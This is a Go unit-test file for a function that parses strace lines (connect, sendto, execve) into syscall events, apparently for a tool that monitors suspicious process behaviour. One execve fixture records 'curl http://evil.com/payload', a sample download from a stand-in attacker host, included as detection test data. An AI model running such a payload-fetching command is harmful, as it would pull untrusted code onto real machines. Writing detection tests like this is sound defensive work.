package probe

import (
	"testing"

	"github.com/RalianENG/kojuto/internal/types"
)

func TestParseStraceLine_Connect_IPv4(t *testing.T) {
	line := `[pid 12345] connect(3, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("93.184.216.34")}, 16) = -1 ENETUNREACH`

	evt, ok := parseStraceLine(line)
	if !ok {
		t.Fatal("expected parse to succeed")
	}

	if evt.Syscall != types.EventConnect {
		t.Errorf("expected syscall connect, got %s", evt.Syscall)
	}

	if evt.DstPort != 443 {
		t.Errorf("expected port 443, got %d", evt.DstPort)
	}

	if evt.DstAddr != "93.184.216.34" {
		t.Errorf("expected addr 93.184.216.34, got %s", evt.DstAddr)
	}

	if evt.PID != 12345 {
		t.Errorf("expected pid 12345, got %d", evt.PID)
	}
}

func TestParseStraceLine_Connect_IPv6(t *testing.T) {
	line := `[pid 999] connect(5, {sa_family=AF_INET6, sin6_port=htons(80), sin6_addr=inet6_addr("::1")}, 28) = 0`

	evt, ok := parseStraceLine(line)
	if !ok {
		t.Fatal("expected parse to succeed")
	}

	if evt.Family != 10 {
		t.Errorf("expected family 10 (AF_INET6), got %d", evt.Family)
	}
}

func TestParseStraceLine_Sendto(t *testing.T) {
	line := `[pid 500] sendto(4, "\0\0\1\0\0\1...", 29, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("8.8.8.8")}, 16) = 29`

	evt, ok := parseStraceLine(line)
	if !ok {
		t.Fatal("expected sendto parse to succeed")
	}

	if evt.Syscall != types.EventSendto {
		t.Errorf("expected syscall sendto, got %s", evt.Syscall)
	}

	if evt.DstPort != 53 {
		t.Errorf("expected port 53, got %d", evt.DstPort)
	}

	if evt.DstAddr != "8.8.8.8" {
		t.Errorf("expected addr 8.8.8.8, got %s", evt.DstAddr)
	}
}

func TestParseStraceLine_Execve(t *testing.T) {
	line := `[pid 777] execve("/usr/bin/curl", ["curl", "http://evil.com/payload"], 0x...) = 0`

	evt, ok := parseStraceLine(line)
	if !ok {
		t.Fatal("expected execve parse to succeed")
	}

	if evt.Syscall != types.EventExecve {
		t.Errorf("expected syscall execve, got %s", evt.Syscall)
	}

	if evt.Comm != "/usr/bin/curl" {
		t.Errorf("expected comm /usr/bin/curl, got %s", evt.Comm)
	}

	if evt.Cmdline != "curl http://evil.com/payload" {
		t.Errorf("expected cmdline 'curl http://evil.com/payload', got %q", evt.Cmdline)
	}

	if evt.PID != 777 {
		t.Errorf("expected pid 777, got %d", evt.PID)
	}
}

func TestParseStraceLine_Irrelevant(t *testing.T) {
	lines := []string{
		"openat(AT_FDCWD, \"/etc/hosts\", O_RDONLY) = 3",
		"connect(3, {sa_family=AF_UNIX, sun_path=\"/var/run/nscd/socket\"}, 110) = -1",
		"",
		"some random text",
	}

	for _, line := range lines {
		if _, ok := parseStraceLine(line); ok {
			t.Errorf("expected parse to fail for %q", line)
		}
	}
}

func TestParseStraceLine_NoPID(t *testing.T) {
	line := `connect(3, {sa_family=AF_INET, sin_port=htons(8080), sin_addr=inet_addr("127.0.0.1")}, 16) = 0`

	evt, ok := parseStraceLine(line)
	if !ok {
		t.Fatal("expected parse to succeed")
	}

	if evt.PID != 0 {
		t.Errorf("expected pid 0 (no pid prefix), got %d", evt.PID)
	}
}
